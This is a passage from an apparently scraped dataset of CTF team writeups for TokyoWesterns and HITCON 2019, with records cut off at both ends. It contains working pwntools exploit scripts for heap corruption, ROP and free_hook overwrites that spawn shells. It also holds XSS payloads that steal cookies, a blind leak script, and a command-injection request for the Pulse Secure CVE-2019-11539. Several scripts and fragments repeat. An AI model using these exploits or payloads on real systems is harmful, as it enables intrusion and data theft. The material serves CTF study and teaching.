p.sendline(str(size))\n    p.recvuntil('(m/t): ')\n    p.sendline(where)\n\ndef Free(idx):\n    p.recvuntil('Your choice: ')\n    p.sendline('2')\n    p.recvuntil('Index: ')\n    p.sendline(str(idx))\n\ndef Free_s(idx):\n    return '2\\n' + str(idx) + '\\n'\n\ndef Write(idx):\n    p.recvuntil('Your choice: ')\n    p.sendline('3')\n    p.recvuntil('Index: ')\n    p.sendline(str(idx))\n\ndef Read(idx, size, buf):\n    p.recvuntil('Your choice: ')\n    p.sendline('4')\n    p.recvuntil('Index: ')\n    p.sendline(str(idx))\n    p.recvuntil('Size: ')\n    p.sendline(str(size))\n    p.recvuntil('Content: ')\n    p.send(buf)\n\ndef Copy(src_idx, dst_idx, size, ch):\n    p.recvuntil('Your choice: ')\n    p.sendline('5')\n    p.recvuntil('Src index: ')\n    p.sendline(str(src_idx))\n    p.recvuntil('Dst index: ')\n    p.sendline(str(dst_idx))\n    p.recvuntil('Size: ')\n    p.sendline(str(size))\n    p.recvuntil('(y/n): ')\n    p.sendline(ch)\n\ndef Copy_s(src_idx, dst_idx, size, ch):\n    return '5\\n' + str(src_idx) + '\\n' + str(dst_idx) + '\\n' + str(size) + '\\n' + ch + '\\n'\n\ndef GameStart(ip, port, debug):\n    global p\n    if debug == 1:\n        p = process('./multi_heap', env = {'LD_PRELOAD' : './libc.so.6'})\n    else:\n        p = remote(ip, port)\n    for i in range(3):\n        Alloc('long', 0x500, 'm')\n\n    for i in range(2):\n        Free(0)\n    Alloc('long', 0x500, 'm')\n    Alloc('long', 0x500, 'm')\n    Write(1)\n    libc_addr = int(p.recvline()) - 0x3ebca0\n    heap_addr = int(p.recvline()) - 0x123f0\n    log.info('libc addr is : ' + hex(libc_addr))\n    log.info('heap addr is : ' + hex(heap_addr))\n    Alloc('char', 0x100, 'm')\n    Alloc('char', 0x100, 'm')\n    Read(4, 8, p64(heap_addr + 0x12fe0))\n    # p.recv(1024)\n    # p.sendline('10')\n    # Copy(4, 3, 8, 'y')\n    # Write(3)\n    # Write(4)\n    # Free(3)\n    buf = Copy_s(4, 3, 8, 'y') + Free_s(3)\n    p.send(buf)\n    Alloc('char', 0x100, 'm')\n    Alloc('char', 0x100, 'm')\n    Write(5)\n    data = p.recvline()\n    if '==' in data:\n        print 'error !'\n        return\n\n    one_gadget = 0x4f2c5\n    one_gadget = 0x4f322\n    # one_gadget = 0xe569f\n    # one_gadget = 0xe5858\n    # one_gadget = 0xe585f\n    # one_gadget = 0xe5863\n    # one_gadget = 0x10a38c\n    # one_gadget = 0x10a398\n\n    pie_addr = u64(data[ : -1] + '\\x00' * 2) - 0x205bc8\n    log.info('pie addr is : ' + hex(pie_addr))\n    payload = p64(heap_addr + 0x12fe0 + 0x20) + p64(0) + p64(0) + p64(0) + p64(one_gadget + libc_addr) * 4\n    Read(5, len(payload), payload)\n\n    Free(3)\n\n    # gdb.attach(p)\n\n    p.interactive()\n\nif __name__ == '__main__':\n    GameStart('multiheap.chal.ctf.westerns.tokyo', 10001, 0)\n```\n\n\n### printf\n\n```pyhton\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\ndef GameStart(ip, port, debug):\n    global p\n    if debug == 1:\n        # p = process(['./ld-linux.so.2', './printf'], env = {\"LD_PRELOAD\" : './libc.so.6'})\n        p = process(", "solution_code": "#! /usr/bin/env python2\n# -*- coding: utf-8 -*-\n# vim:fenc=utf-8\n#\n# Copyright © 2018 anciety <anciety@anciety-pc>\n#\n# Distributed under terms of the MIT license.\nimport sys\nimport os\nimport os.path\nfrom pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\ncontext.terminal = ['ancyterm', '-s', '192.168.142.1', '-t', 'alacritty', '-e']\n\n# synonyms for faster typing\ntube.s = tube.send\ntube.sl = tube.sendline\ntube.sa = tube.sendafter\ntube.sla = tube.sendlineafter\ntube.r = tube.recv\ntube.ru = tube.recvuntil\ntube.rl = tube.recvline\ntube.rr = tube.recvregex\ntube.irt = tube.interactive\n\nif len(sys.argv) > 2:\n    DEBUG = 0\n    HOST = sys.argv[1]\n    PORT = int(sys.argv[2])\n\n    p = remote(HOST, PORT)\nelse:\n    DEBUG = 1\n    if len(sys.argv) == 2:\n        PATH = sys.argv[1]\n\n    p = process(PATH)\n\n\n# by w1tcher who dominates pwnable challenges\ndef house_of_orange(head_addr, system_addr, io_list_all):\n    payload = b'/bin/sh\\x00'\n    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)\n    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4\n    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \\\n            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)\n    return payload\n\n\norig_attach = gdb.attach\ndef gdb_attach(*args, **kwargs):\n    if DEBUG:\n        orig_attach(*args, **kwargs)\ngdb.attach = gdb_attach\n\n\ndef main():\n    # Your exploit script goes here\n    p.ru(':)\\n')\n    pop_rdi = 0x400773\n    gets = 0x400580\n\n    ropchain = p64(pop_rdi)\n    ropchain += p64(0x601090)\n    ropchain += p64(gets)\n    ropchain += p64(0x601090)\n\n    payload = 'a' * 0x108 + ropchain\n\n    shellcode = shellcraft.sh()\n    gdb.attach(p)\n    p.sl(payload)\n    p.sl(asm(shellcode))\n    p.irt()\n\nif __name__ == '__main__':\n    main()\n\n\n\nfrom pwn import *\ncontext.log_level = 'debug'\n\ndef Alloc(which, size, where):\n    p.recvuntil('Your choice: ')\n    p.sendline('1')\n    p.recvuntil('Which: ')\n    p.sendline(which)\n    p.recvuntil('Size: ')\n    p.sendline(str(size))\n    p.recvuntil('(m/t): ')\n    p.sendline(where)\n\ndef Free(idx):\n    p.recvuntil('Your choice: ')\n    p.sendline('2')\n    p.recvuntil('Index: ')\n    p.sendline(str(idx))\n\ndef Free_s(idx):\n    return '2\\n' + str(idx) + '\\n'\n\ndef Write(idx):\n    p.recvuntil('Your choice: ')\n    p.sendline('3')\n    p.recvuntil('Index: ')\n    p.sendline(str(idx))\n\ndef Read(idx, size, buf):\n    p.recvuntil('Your choice: ')\n    p.sendline('4')\n    p.recvuntil('Index: ')\n    p.sendline(str(idx))\n    p.recvuntil('Size: ')\n    p.sendline(str(size))\n    p.recvuntil('Content: ')\n    p.send(buf)\n\ndef Copy(src_idx, dst_idx, size, ch):\n    p.recvuntil('Your choice: ')\n    p.sendline('5')\n    p.recvuntil('Src index: ')\n    p.sendline(str(src_idx))\n    p.recvuntil('Dst index: ')\n    p.sendline(str(dst_idx))\n    p.recvuntil('Size: ')\n    p.sendline(str(size))\n    p.recvuntil('(y/n): ')\n    p.sendline(ch)\n\ndef Copy_s(src_idx, dst_idx, size, ch):\n    return '5\\n' + str(src_idx) + '\\n' + str(dst_idx) + '\\n' + str(size) + '\\n' + ch + '\\n'\n\ndef GameStart(ip, port, debug):\n    global p\n    if debug == 1:\n        p = process('./multi_heap', env = {'LD_PRELOAD' : './libc.so.6'})\n    else:\n        p = remote(ip, port)\n    for i in range(3):\n        Alloc('long', 0x500, 'm')\n\n    for i in range(2):\n        Free(0)\n    Alloc('long', 0x500, 'm')\n    Alloc('long', 0x500, 'm')\n    Write(1)\n    libc_addr = int(p.recvline()) - 0x3ebca0\n    heap_addr = int(p.recvline()) - 0x123f0\n    log.info('libc addr is : ' + hex(libc_addr))\n    log.info('heap addr is : ' + hex(heap_addr))\n    Alloc('char', 0x100, 'm')\n    Alloc('char', 0x100, 'm')\n    Read(4, 8, p64(heap_addr + 0x12fe0))\n    # p.recv(1024)\n    # p.sendline('10')\n    # Copy(4, 3, 8, 'y')\n    # Write(3)\n    # Write(4)\n    # Free(3)\n    buf = Copy_s(4, 3, 8, 'y') + Free_s(3)\n    p.send(buf)\n    Alloc('char', 0x100, 'm')\n    Alloc('char', 0x100, 'm')\n    Write(5)\n    data = p.recvline()\n    if '==' in data:\n        print 'error !'\n        return\n\n    one_gadget = 0x4f2c5\n    one_gadget = 0x4f322\n    # one_gadget = 0xe569f\n    # one_gadget = 0xe5858\n    # one_gadget = 0xe585f\n    # one_gadget = 0xe5863\n    # one_gadget = 0x10a38c\n    # one_gadget = 0x10a398\n\n    pie_addr = u64(data[ : -1] + '\\x00' * 2) - 0x205bc8\n    log.info('pie addr is : ' + hex(pie_addr))\n    payload = p64(heap_addr + 0x12fe0 + 0x20) + p64(0) + p64(0) + p64(0) + p64(one_gadget + libc_addr) * 4\n    Read(5, len(payload), payload)\n\n    Free(3)\n\n    # gdb.attach(p)\n\n    p.interactive()\n\nif __name__ == '__main__':\n    GameStart('multiheap.chal.ctf.westerns.tokyo', 10001, 0)\n\nfrom pwn import *\ncontext.log_level = 'debug'\n\ndef add(sz, des):\n    p.recvuntil('> ')\n    p.sendline('1')\n    p.recvuntil(' > ')\n    p.sendline(str(sz))\n    p.recvuntil(' > ')\n    p.send(des)\n    p.recvuntil('Added id ')\n    return int(p.recvline()[ : -1])\n\ndef delete(idx):\n    p.recvuntil('> ')\n    p.sendline('3')\n    p.recvuntil(' > ')\n    p.sendline(str(idx))\n\ndef modify(idx, des):\n    p.recvuntil('> ')\n    p.sendline('4')\n    p.recvuntil(' > ')\n    p.sendline(str(idx))\n    p.recvuntil(' > ')\n    p.send(des)\n\ndef rename(name):\n    p.recvuntil('> ')\n    p.sendline('99')\n    p.recvuntil('name... ')\n    p.send(name)\n\ndef GameStart(ip, port, debug):\n    global p\n    if debug == 1:\n        p = process('./karte', env = {\"LD_PRELOAD\" : './libc.so.6'})\n    else:\n        p = remote(ip, port)\n    p.recvuntil('name... ')\n    p.send(p64(0) + p64(0x80))\n\n    for i in range(7):\n        idx = add(0x78, 'swing tql')\n        delete(idx)\n\n    for i in range(7):\n        idx = add(0x68, 'swing tql')\n        delete(idx)\n\n    for i in range(7):\n        idx = add(0x10, 'swing tql')\n        delete(idx)\n\n    idx1 = add(0x78, 'swing tql')\n    idx2 = add(0x78, 'swing tql')\n    delete(idx1)\n    delete(idx2)\n    modify(idx2, p64(0x6021A0)[ : 4])\n    idx1 = add(0x78, 'swing tql')\n    \n\n    idx2 = add(0x78, p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 4 + p64(0) + p64(0x21))\n    rename(p64(0) + p64(0x21))\n    idx3 = add(0x801, 'swing tql')\n    delete(idx2)\n    delete(idx3)\n\n    rename(p64(0) + p64(0x21) + p64(0) + p64(0x602118 - 5 - 0x10))\n\n    idx2 = add(0x10, 'swing tql')\n    rename(p64(0) + p64(0x71))\n    delete(idx2)\n    rename(p64(0) + p64(0x71) + p64(0x602110))\n    delete(idx1)\n\n    idx1 = add(0x68, '/bin/sh;')\n    # gdb.attach(p, 'b * 0x400B17\\nc')\n    idx2 = add(0x68, p64(0x0000000400000003) + p64(0) * 3 + p64(0x0000100000001) + p64(0x602018) + p64(0) + p64(0) + p64(0x0000200000001) + p64(0x602068) + p64(0x0000deadc0bebeef))\n\n    modify(1, p64(0x400760)[ : 6])\n    delete(2)\n    libc_base = u64(p.recvline()[ : -1] + '\\x00' * 2) - 0x97070\n    log.info('libc base is : ' + hex(libc_base))\n    system_addr = libc_base + 0x4f440\n\n    modify(2, p64(system_addr)[ : 6])\n\n    p.recvuntil('> ')\n    p.sendline('1')\n    p.recvuntil(' > ')\n    p.sendline(str(0x6021b0))\n\n\n\n    p.interactive()\n\nif __name__ == '__main__':\n    GameStart('karte.chal.ctf.westerns.tokyo', 10001, 0)\n\nfrom pwn import *\n\nlocal=0\nremote_addr=['ast-alloc.chal.ctf.westerns.tokyo',10001]\n\nlibc=ELF('./bytedance/libc-2.27.so')\n\np=remote(remote_addr[0],remote_addr[1])\n#context.log_level = True\n\nru = lambda x : p.recvuntil(x)\nsn = lambda x : p.send(x)\nrl = lambda   : p.recvline()\nsl = lambda x : p.sendline(x)\nrv = lambda x : p.recv(x)\nsa = lambda a,b : p.sendafter(a,b)\nsla = lambda a,b : p.sendlineafter(a,b)\n\ndef lg(s,addr = None):\n    if addr:\n        print('\\033[1;31;40m[+]  %-15s  --> 0x%8x\\033[0m'%(s,addr))\n    else:\n        print('\\033[1;32;40m[-]  %-20s \\033[0m'%(s))\n\ndef raddr(a=6):\n    if(a==6):\n        return u64(rv(a).ljust(8,'\\x00'))\n    else:\n        return u64(rl().strip('\\n').ljust(8,'\\x00'))\n\ndef choice(idx):\n    #ru(\"5. exit\\n\")\n    #rl()\n    sla(\": \", str(idx))\n\ndef malloc(size, content):\n    choice(1)\n    sla(\": \", str(size))\n    sa(\": \", content)\n\ndef calloc(size, content):\n    choice(2)\n    sla(\": \", str(size))\n    sa(\": \", content)\n\ndef realloc(size, content):\n    choice(3)\n    sla(\": \", str(size))\n    if(size > 0):\n        sa(\": \", content)\n    else:\n        ru(\":\")\n\ndef rm(idx):\n    choice(4)\n    sla(\": \", idx)\n\ndef create(size):\n    realloc(size, 'AA')\n    for i in range(7):\n        rm('r')\n    realloc(0,'')\n\nif __name__ == '__main__':\n    create(0x30)\n    create(0x20)\n    create(0x40)\n    create(0x60)\n    create(0x50)\n    realloc(0x70, 'AA')\n    realloc(0,'')\n    sla(\": \", '1'*0x500)\n    #realloc(0x90, p32(0xdd0760)[0:3])\n    #realloc(0x28,p64(0))\n    #realloc(0,'')\n    realloc(0x150,'\\x00'*0x128 + p64(0xe1)+p32(0x7758)[0:2])\n    realloc(0,'')\n    realloc(0x50,p64(0))\n    malloc(0x58,'/bin/sh\\x00'+p64(0xfbad3c80)+p64(0)*3+p8(0))\n    rv(8)\n    libc_addr = u64(rv(8)) - 0x3ed8b0\n    lg(\"libc\",libc_addr)\n    libc.address = libc_addr\n    realloc(0x150, '\\x00'*0x58 + p64(0x21) + p64(libc.symbols['__free_hook'])+p64(0x21)*4)\n    realloc(0,'')\n    realloc(0x70,'\\x00')\n    realloc(0,'')\n    realloc(0x70,p64(libc.symbols['system']))\n    rm('m')\n    sl(\"cat flag\")\n    p.interactive()\n\n\nfrom PIL import Image\nwith open(\"t\", \"rb\") as f:\n    t = f.read()\nwith open(\"o\", \"r\") as f:\n    o = f.readlines()\n\nimg = Image.open(\"flag_enc.png\")\np = img.load()\nflag = Image.new(\"RGBA\", (768, 768))\nfor i in range(768):\n    for j in range(768):\n        tt = t[i*768+j]\n        oo = int(o[i])\n        pp = p[i,j]\n        flag.putpixel((oo,j), (pp[0]^tt, pp[1]^tt, pp[2]^tt, 255))\nflag.save(\"flag.png\")\n\n\nfrom ida_bytes import get_dword, patch_dword\n\ncode = 0x401354\nmagic = 0x10028160\n#ln, ptr = 0x2C0, 0x402114\n#ln, ptr = 0x760, 0x4023DC\n#ln, ptr = 0x830, 0x402B44\nln, ptr = 0x930, 0x40337C\nkey = get_dword(ptr) ^ magic\nprint('0x%08X' % (key))\nfor i in xrange(0, ln, 4):\n    patch_dword(code + i, get_dword(ptr + i) ^ key)\n\n\nfrom struct import pack, unpack\n\ndef ROL(a, b):\n    return ((a << b) & 0xFFFFFFFF) | (a >> (0x20 - b))\ndef ROR(a, b):\n    return ((a << (0x20 - b)) & 0xFFFFFFFF) | (a >> (b))\ndef ADD(a, b):\n    return ((a + b) & 0xFFFFFFFF)  \ndef SUB(a, b):\n    return ((a - b) & 0xFFFFFFFF)  \nkeys = [\n\"ee9ef18322ed45da846d740f6dab5659efc01789b6f35c7add1267791ffb096069c55b6ad3576c37380dbae978e082bec16c8577eecf73a2832c14d4a674730168aeaea30423b5029e4b3d0ebf80b01e4b37a8300f0ff18409358202abbfdad0c65353c88e268e76\",\n\"810378a893b825d35ff2892881923c097013a30cbebb1af0eb1e9b06cd655b3312f8a0db2e1f6426e048cdcd0980fb2f6d7d07754a62238f0af2c87101b854e236a93b442f4a4f6f5f59ba8aa630859a0e5a2ac48d30d89abd8d6242de10abab0e66959f3ce90eae\",\n\"504935776d303b1135128a3fd16eafe3e9d14cf5e871fb9eba448d297022678f2370a9e95bd40071e4a5f208a5e409eec79f53c6538753c84b1b9ef50e2968d203d2f176b2e91799d4328a900101d2e88ef89260ec73fc845827d9cb2464a64417957782febe39ec\",\n\"f82654105fd5452901c16e5a75fc603ca35f36bc9c697655158754991fbd081c975637d54cfc161f91e71b54ff149316dbc2bfdd7f1e139c6e6a9bec9808701967c00b63c8df545161579a7304e3bc9e469d8f6da45690369ee0c45be8bb39a1623d0293779197e5\",\n\"edb6156e9e3459f2d8fdd4fe2b489a75d60f154bf19826d4e18cd885ee96372594f61a9447b39709bb2eb2cd6cf55e36903e8f45c336c5a14d28e100377b555ff8dff6ad96a06062f51fb83d0a078e7afa09067a19ed6d9ed54377375b5aad8e2147bf69a493ea04\",]\nkeys = map(lambda x:unpack('<26I', x.decode('hex')), keys)\n\ns = 'd4f5f0aa8aeee7c83cd8c039fabdee6247d0f5f36edeb24ff9d5bc10a1bd16c12699d29f54659267'.decode('hex')\nflag = ''\nr = 0\nfor i in xrange(0, len(s), 8):\n    x, y = unpack('>2I', s[i:i+8])\n    k = keys[r]\n    for ii in xrange(24):\n        i = 24 - ii - 1\n        y, t = x, y\n        x = ROR(SUB(t, k[i + 2]), y & 0x1F) ^ y \n    y = SUB(y, k[1])\n    x = SUB(x, k[0])\n    flag += pack('>2I', x, y)\n    r += 1\nprint(flag)\n\n\nimport requests\n \nURL = \"http://phpnote.chal.ctf.westerns.tokyo\" # changeme\n \ndef trigger(c, idx):\n   import string\n   p = '''<script>f=function(n){eval('X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>'''\n   p = string.Template(p).substitute({'idx': idx, 'c': c})\n   return p\n \ndef leak(idx):\n   l, h = 0, 0x100\n   while h - l > 1:\n       m = (h + l) // 2\n       gid = trigger(m, idx)\n       # r = requests.post(URL + '/?action=login', data={'realname': gid, 'nickname': '1'})\n       # print r.content\n       # exit()\n       s = requests.session()\n       s.post(URL + '/?action=login', data={'realname': gid, 'nickname': ''})\n       if \"/?action=login\" in s.post(URL + '/?action=login', data={'realname': gid, 'nickname': '</body>'}).content:\n           l = m\n       else:\n           h = m\n   return chr(l)\n \ndata = ''\nfor i in range(100):\n   data += leak(i)\n   print(data)\n\n\n    for i in range(2):\n        Free(0)\n    Alloc('long', 0x500, 'm')\n    Alloc('long', 0x500, 'm')\n    Write(1)\n    libc_addr = int(p.recvline()) - 0x3ebca0\n    heap_addr = int(p.recvline()) - 0x123f0\n    log.info('libc addr is : ' + hex(libc_addr))\n    log.info('heap addr is : ' + hex(heap_addr))\n    Alloc('char', 0x100, 'm')\n    Alloc('char', 0x100, 'm')\n    Read(4, 8, p64(heap_addr + 0x12fe0))\n    # p.recv(1024)\n    # p.sendline('10')\n    # Copy(4, 3, 8, 'y')\n    # Write(3)\n    # Write(4)\n    # Free(3)\n    buf = Copy_s(4, 3, 8, 'y') + Free_s(3)\n    p.send(buf)\n    Alloc('char', 0x100, 'm')\n    Alloc('char', 0x100, 'm')\n    Write(5)\n    data = p.recvline()\n    if '==' in data:\n        print 'error !'\n        return\n\n\n    global p\n    if debug == 1:\n        # p = process(['./ld-linux.so.2', './printf'], env = {\"LD_PRELOAD\" : './libc.so.6'})\n        p = process('./printf', env = {\"LD_PRELOAD\" : './libc.so.6'})\n    else:\n        p = remote(ip, port)\n\n\n    GameStart('printf.chal.ctf.westerns.tokyo', 10001, 0)\n\n\n    if addr:\n        print('\\033[1;31;40m[+]  %-15s  --> 0x%8x\\033[0m'%(s,addr))\n    else:\n        print('\\033[1;32;40m[-]  %-20s \\033[0m'%(s))\n\n\n    uint64_t y = 0;\n    uint8_t *p = (uint8_t*)&y;\n    p[0] = a;\n    p[1] = b;\n    p[2] = c;\n    p[3] = d;\n    p[4] = arr[0];\n    p[5] = arr[1];\n    p[6] = arr[2];\n    p[7] = arr[3];\n    if (check4(y))\n        printf(\"%c%c%c%c%c%c%c%c\\n\", a, b, c, d, arr[0], arr[1], arr[2], arr[3]);\n\n\n    for (a = begin; a < end; a++)\n    {\n        for (b = begin; b < end; b++)\n        {\n            for (c = begin; c < end; c++)\n            {\n                for (d = begin; d < end; d++)\n                {\n                    crack(chars[a], chars[b], chars[c], chars[d]);\n                }\n            }\n        }\n        printf(\"a: %c\\n\", chars[a]);\n    }\n\n\n       m = (h + l) // 2\n       gid = trigger(m, idx)\n       # r = requests.post(URL + '/?action=login', data={'realname': gid, 'nickname': '1'})\n       # print r.content\n       # exit()\n       s = requests.session()\n       s.post(URL + '/?action=login', data={'realname': gid, 'nickname': ''})\n       if \"/?action=login\" in s.post(URL + '/?action=login', data={'realname': gid, 'nickname': '</body>'}).content:\n           l = m\n       else:\n           h = m\n", "tools": ["python", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20190904-tokyowesterns\\README.md", "file_size": 28097, "scraped_at": "2025-10-26T18:19:25.784458"}
{"id": "r3kapig_writeup_HITCON_CTF_2019_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "HITCON CTF 2019 Writeup", "attack_type": "AES", "writeup": "# HITCON CTF 2019 Writeup\n\n\n## web\n\n### Virtual Public Network [183pts]\n\n> http://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html\n\nCVE-2019-11539\n\n![](https://i.loli.net/2019/10/15/U8YQ5DCkc6ZErhv.png)\n\nUse `\\x2a` instead of `$`\n\n```\nGET /cgi-bin/diag.cgi?options=-r$x%3d\"bash+-c+\\\"/\\x2aREAD_FLAG\\x2a\\\"\",system$x%23+2>./tmp/cmn.thtml+<&tpl=cmn HTTP/1.1\n```\n\n### Luatic [230pts]\n\n![](https://i.loli.net/2019/10/15/Lvr7WmRI3gnPYEs.png)\n\nUse `_GET` to override `_POST` and then use `_POST` to override global variables to bypass filter:\n\n![](https://i.loli.net/2019/10/15/PdLlKoFpGetgYj4.png)\n\nOverwrite math.random with the redis `EVAL` command:\n\n![](https://i.loli.net/2019/10/15/5TUAv7tdmCfRVnu.png)\n\n### Bounty Pl33z [255pts]\n\nAfter searching, we found that `-->` can be used as a `SingleLineComment`:\n\n> https://stackoverflow.com/a/18638833\n\nBut `\\n` and `\\r` are filtered.\n\nAfter reading ECMA-262, we found other line terminators:\n\n> http://www.ecma-international.org/ecma-262/6.0/#sec-line-terminators\n\n![](https://i.loli.net/2019/10/15/btWyJmw3Q7o4XMO.png)\n\nSo the final payload:\n\n```\nhttp://3.114.5.202/fd.php?q=pupiles。qwer。design/?\"%2beval(atob(`ZG9jdW1lbnQuY29va2ll`))%E2%80%A8-->\n```\n\n## reverse\n\n### EmojiVM [187pts]\nA challenge of vm_re.The Data Struct is a tree like this.\n\n    struct node{\n       qword inuse;\n       node* parent;\n       node* left;\n       node* right;\n       int value;\n       int idx;\n    }\n    // left->value < parent->value < right->value\nwe can use emoji(4byte) to specify the appropriate operation（ node->idx corresponding to emoji_value) or use emoji to get a num in stack(0~10 , also by node->idx). If you want to get a num which more than 10, you can pushu some num(0~9) in stack and use add/multi/sub. The correspondence between the opcode and the operand is in sub_4221 and sub_4db8.\nBy debug the program ,we can get the conditon are:\n1. Input string length is 0x18\n2. Input form: XXXX-XXXX-XXXX-XXXX-XXXX\n3. The conversion rules of each group(4 byte) are as follows:\n    First byte: x= x+30\n    Second byte: x=(x-8)xor 7\n    Third byte: x=((x+44)xor68)-4\n    The fourth byte: x=x^0x61\n    \n```python=\nimport os\nm = [0x8e,0x63,0xcd,0x12,0x4b,0x58,0x15,0x17,0x51,0x22,0xd9,0x04,0x51,0x2c,0x19,0x15,0x86,0x2c,0xd1,0x4c,0x84,0x2e,0x20,0x06]\n\nbyte = 0\nans = ''\nfor i in range(0x18):\n   if (i%4)==0:\n       byte = m[i]-30\n   elif (i%4==1):\n       byte = (m[i] ^ 7) + 8\n   elif (i%4==2):\n       byte = ((m[i] + 4) ^ 68) - 44\n   else:\n       byte = m[i] ^ 0x61\n   ans += chr(byte&0xff)\nprint ans\n\n```\n\n### Core Dumb [242pts]\n\nThere are five encrypted shellcodes in the file, decrypt these shellcodes with `shellcode[i] ^= key[i%4]`. At the beginning of main function, proc init five key and encrypt shellcode,use idapython decrypt shellcode and we can found five function.These functions constrain the flag,`flag[0:10]`:`flag[i] ^= (key[i%4] - 7)`,`flag[10:18]` is similar to TEA,`flag[18:36]` is base64,`flag[36:48]` is similar to rc4,`flag[48:52]` is a hash function, reverse the first four function and exhaustive search the last four bytes to get the flag.\n\n### EV3 Arm [221pts]\n\nThe lsm assembly can be retrieved by [lms-hacker-tools](https://github.com/ev3dev/lms-hacker-tools/tree/master/EV3).\nDump all calls in which certain parameters represent motor, power, and angle.\nWatch the video given in the problem description, and then we can know how these combinations of parameters work.\nSimulate the car by hand to get the flag.\n\n### Suicune [305pts]\n\nA challenge similar with Counting in googlectf. The encryption are implemented with low performance. \nWe analyse the binary and get the implmenation of the key generator in details. It contains a very ineffient sorting algorithm.\nWe remaster the algorithm in high performance and make sure it sharing incomplete post-sorted result with the original one. \nThen we enumerate all the possible key to decrypt the given cipher.\n```python\ntry:\n    import numpy as np\nexcept ImportError as e:\n    sys.stderr.write('You need to install numpy.\\n')\n\ndef pcg32(param1:np.uint64=None, param2:np.uint64=None) -> np.uint32:\n    \"\"\"\n    All we ever do is call this over and over, so let's make it\n    a generator instead of a class.\n\n    param1 -- initial state of the engine.\n    param2 -- the increment.\n\n    yields -- an int, of which 32 bits are suitable scrambled.\n    \"\"\"\n\n    np.seterr(all='ignore') # remove overflow messages.\n\n    if param1 is None: param1 = random.random() * 9223372036854775807\n    if param2 is None: param2 = random.random() * 9223372036854775807\n\n    engine = np.array([param1, param2], dtype='uint64')\n    multiplier = np.uint64(6364136223846793005)\n    big_1 = np.uint32(1)\n    big_18 = np.uint32(18)\n    big_27 = np.uint32(27)\n    big_59 = np.uint32(59)\n    big_31 = np.uint32(31)\n\n    while True:\n        old_state = engine[0]\n        inc = engine[1]\n        engine[0] = old_state * multiplier + (inc | big_1)\n        xorshifted = np.uint32(((old_state ", "solution_code": "try:\n    import numpy as np\nexcept ImportError as e:\n    sys.stderr.write('You need to install numpy.\\n')\n\ndef pcg32(param1:np.uint64=None, param2:np.uint64=None) -> np.uint32:\n    \"\"\"\n    All we ever do is call this over and over, so let's make it\n    a generator instead of a class.\n\n    param1 -- initial state of the engine.\n    param2 -- the increment.\n\n    yields -- an int, of which 32 bits are suitable scrambled.\n    \"\"\"\n\n    np.seterr(all='ignore') # remove overflow messages.\n\n    if param1 is None: param1 = random.random() * 9223372036854775807\n    if param2 is None: param2 = random.random() * 9223372036854775807\n\n    engine = np.array([param1, param2], dtype='uint64')\n    multiplier = np.uint64(6364136223846793005)\n    big_1 = np.uint32(1)\n    big_18 = np.uint32(18)\n    big_27 = np.uint32(27)\n    big_59 = np.uint32(59)\n    big_31 = np.uint32(31)\n\n    while True:\n        old_state = engine[0]\n        inc = engine[1]\n        engine[0] = old_state * multiplier + (inc | big_1)\n        xorshifted = np.uint32(((old_state >> big_18) ^ old_state) >> big_27)\n        rot = np.uint32(old_state >> big_59)\n        yield np.uint32((xorshifted >> rot) | (xorshifted << ((-rot) & big_31)))\n\ndef reverse(box, left):\n    right = len(box)-1\n    while(left<right):\n        box[left], box[right] = box[right], box[left]\n        left += 1\n        right -= 1\n\ndef find(box, left):\n    if left<0:\n        return True\n    r = len(box) - 1\n    while(r!=left):\n        # print(left, r)\n        if box[left]<box[r]:\n            box[left], box[r] = box[r], box[left]\n            # fuck\n            reverse(box, left+1)\n            return True\n        r -= 1\n    return False\n\ndef yysort(box, times):\n    l = len(box)\n\n    n = 100\n    f = [0] * n\n    for i in range(1,n):\n        f[i] = (f[i-1]+1)*i-1\n\n    while times != 0:\n        left = l-1\n        while left!=0 and box[left-1] > box[left]:\n            left -= 1\n        if left == 0:\n            break\n        find(box, left-1)\n        times -= 1\n        if times == 0:\n            break\n        m = l-left\n        while f[m] > times:\n            m -= 1\n        reverse(box, l-m)\n        times -= f[m]\n\n    return box\n\ndef unknown_generator(times):\n    global x\n    box = list(range(0x100))\n    for i in range(times):\n        xx = next(x) % (0x100-i)\n        y = 0xff-i\n        box[xx], box[y] = box[y], box[xx]\n    return box\n    \ndef shuffle_pcg_result(pcg_res, length):\n    res_list = []\n    for i in range(0, len(pcg_res), length):\n        res_list.append(pcg_res[i: i + length])\n    return res_list\n\ndef byte_xorer(ba, bb):\n    res = b''\n    for i in range(len(ba)):\n        t = ba[i] ^ bb[i]\n        res += bytes([t])\n    return res\n    \ndef decrypt(keys, buf):\n    rkeys = keys[::-1]\n    cur_cipher = buf\n    for i in range(16):\n        cur_cipher = cur_cipher[::-1]\n        cur_cipher = byte_xorer(cur_cipher, rkeys[i])\n    return cur_cipher\n\ndef encrypt(keys, buf):\n    cur_cipher = buf\n    for i in range(16):\n        key = keys[i]\n        print(key)\n        cur_cipher = byte_xorer(cur_cipher, key)\n        cur_cipher = cur_cipher[::-1]\n    return cur_cipher\n\ndef keygen():\n    global x\n    keys = []\n    for i in range(16):\n        pcg_res = unknown_generator(255)[0: flag_length]\n        key_list = pcg_res\n        # key_list = sort(reverse = True)\n        '''\n        The binary uses custom sort algorithm, it won't sort the list completely. \n        However, the binary uses the incompletely sorted list as key. \n        We cannot replay the algorithm in binary for its poor perfomance\n        '''\n        timesr = (next(x) + 0x100000000) % 0x100000000\n        timesl = (next(x) + 0x100000000) % 0x100000000\n        times = (timesl << 32) | timesr\n        times = (times + 0x10000000000000000) % 0x10000000000000000\n        key_list = yysort(key_list, times)\n        keys.append(key_list)\n        \n    return keys\n\nflag_key = 45193\noutput_file_content = 